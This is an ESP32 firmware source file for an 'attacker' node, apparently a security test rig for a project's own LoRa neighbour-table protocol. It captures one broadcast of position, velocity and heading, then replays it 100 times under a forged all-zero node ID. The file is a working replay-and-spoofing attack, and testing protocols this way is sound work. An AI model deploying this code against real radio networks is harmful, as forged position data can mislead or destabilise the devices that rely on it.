#include "esp_log.h"
#include "esp_mac.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "config.h"
#include "neighbour_table.h"

#include <string.h>

static const char *TAG = "ATTACKER";

extern Neighbour_table NeighbourState[MAX_NEIGHBOURS];

uint8_t mac_addr1[6];
void initial_mac()
{
    esp_read_mac(mac_addr1, ESP_MAC_WIFI_STA);
}

static size_t capture_packet(uint8_t *out, size_t max_len)
{
    while (1) {
        int len = lora_receive_packet(out, max_len);

        if (len > 0) {
            ESP_LOGI(TAG, "Captured packet len=%d", len);
            return len;
        }

        vTaskDelay(pdMS_TO_TICKS(20));
    }
}

// Replay attack every 200ms

static void replay_attack(const uint8_t *pkt, size_t pkt_len)
{
    ESP_LOGW(TAG, "Starting Replay Attack (len=%d)", pkt_len);

    for (int i = 0; i < 100; i++) {

        uint8_t forged[128];
        memcpy(forged, pkt, pkt_len);

        Neighbour_table *fpkt = (Neighbour_table *)forged;

        uint8_t fake_id[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        memcpy(fpkt->node_id, fake_id, 6);

        ESP_LOGI(TAG,
            "Replay #%d as fake node %02X:%02X:%02X:%02X:%02X:%02X SEQ=%lu",
            i + 1,
            fpkt->node_id[0], fpkt->node_id[1], fpkt->node_id[2],
            fpkt->node_id[3], fpkt->node_id[4], fpkt->node_id[5],
            fpkt->seq_number
        );

        lora_send_packet(forged, pkt_len);
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    ESP_LOGW(TAG, "Replay attack done.");
}

void app_main(void)
{
    ESP_LOGI(TAG, "=== Attacker started ===");

    initial_mac();

    // Initialize LoRa
    if (!init_radio()) {
        ESP_LOGE(TAG, "Radio init failed!");
        vTaskDelay(portMAX_DELAY);
    }

    uint8_t captured[128];

    ESP_LOGI(TAG, "Waiting to capture packet...");
    size_t cap_len = capture_packet(captured, sizeof(captured));

    Neighbour_table *pkt = (Neighbour_table *)captured;

    ESP_LOGW(TAG,
        "Captured packet from %02X:%02X:%02X:%02X:%02X:%02X "
        "SEQ=%u TS=%lu.%03u "
        "Pos(%u,%u,%u) Vel(%d,%d,%d) Yaw=%u",
        pkt->node_id[0], pkt->node_id[1], pkt->node_id[2],
        pkt->node_id[3], pkt->node_id[4], pkt->node_id[5],
        pkt->seq_number,
        pkt->ts_s, pkt->ts_ms,
        pkt->x_mm, pkt->y_mm, pkt->z_mm,
        pkt->vx_mm_s, pkt->vy_mm_s, pkt->vz_mm_s,
        pkt->yaw_cd
    );

    // Reuse the captured packet
    replay_attack(captured, cap_len);

    ESP_LOGI(TAG, "Attacker idle.");
    while (1) {
        vTaskDelay(pdMS_TO_TICKS(1000));
    }
}